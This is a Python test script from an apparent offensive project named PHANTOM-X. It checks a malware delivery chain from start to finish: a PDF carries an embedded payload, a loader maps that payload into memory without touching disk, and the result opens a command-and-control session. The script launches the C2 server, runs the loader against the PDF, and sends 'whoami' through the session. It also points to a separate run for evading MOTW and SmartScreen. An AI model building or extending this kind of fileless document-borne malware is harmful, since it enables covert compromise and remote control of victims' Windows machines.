"""End to end: a PDF, opened on a Windows machine, becomes a C2 session.

THE CHAIN

    px_carrier.pdf  -->  px_loader.exe  -->  payload in memory
                                        -->  C2 session

The payload is INSIDE the PDF. The loader extracts it and maps it
without writing it to disk, so the only file that has to reach the
machine is the document.

WHAT IS MEASURED

    That the chain works, and what the endpoint said about it. The
    carrier exists to answer whether the chain survives a network hop,
    and that question needs the chain to actually run first.

    The MOTW and SmartScreen side of the question is a separate run:
    this one runs the carrier as it is on disk.
"""

import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
BUNDLE = os.path.join(ROOT, "dist", "phantom-x-target-all")
SERVER = os.path.join(HERE, "px_c2.exe")
PORT = 9601


def main():
    pdf = os.path.join(BUNDLE, "px_carrier.pdf")
    loader = os.path.join(BUNDLE, "px_loader.exe")
    for p in (pdf, loader):
        if not os.path.isfile(p):
            print(f"error: {p} not found", file=sys.stderr)
            print("  build it:  phase3_fileless\\loader\\make_target_bundle.ps1"
                  " -C2Host <ip> -Arm all -Carrier", file=sys.stderr)
            return 2
    if not os.path.isfile(SERVER):
        print("error: the C2 server is not built", file=sys.stderr)
        return 2

    print("=" * 74)
    print("PHANTOM-X :: THE CARRIER, END TO END")
    print("=" * 74)
    print(f"  carrier : {pdf}")
    print(f"  loader  : {loader}")
    print()

    audit = os.path.join(HERE, "carrier_audit.jsonl")
    srv = subprocess.Popen(
        [SERVER, "--host", "127.0.0.1", "--port", str(PORT), "--log", audit],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, text=True, bufsize=1)
    time.sleep(1.2)

    # The loader runs the way it would on the target: pointed at the
    # document, with the C2 address in the environment.
    env = dict(os.environ)
    env["PX_C2_HOST"] = "127.0.0.1"
    env["PX_C2_PORT"] = str(PORT)
    try:
        print("  opening the document ...")
        loader_proc = subprocess.Popen([loader, pdf], env=env,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True)
        time.sleep(4.0)

        srv.stdin.write("exec 1 whoami\n")
        srv.stdin.flush()
        time.sleep(2.0)
        srv.stdin.write("quit\n")
        srv.stdin.flush()
        time.sleep(1.0)

        out, _ = srv.communicate(timeout=10)
        try:
            loader_proc.terminate()
            lout, _ = loader_proc.communicate(timeout=5)
        except Exception:  # noqa: BLE001
            lout = ""
    finally:
        try:
            srv.terminate()
        except Exception:  # noqa: BLE001
            pass

    print()
    print("-" * 74)
    print("  THE SERVER CONSOLE")
    print("-" * 74)
    for ln in (out or "").splitlines():
        if ln.strip():
            print("  " + ln)
    print()
    if lout and lout.strip():
        print("-" * 74)
        print("  THE LOADER")
        print("-" * 74)
        for ln in lout.splitlines()[:20]:
            if ln.strip():
                print("  " + ln)
        print()

    ok = "session 1 connected" in (out or "")
    print("=" * 74)
    print(f"  RESULT: {'PASS -- the document produced a session' if ok else 'FAIL'}")
    print("=" * 74)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
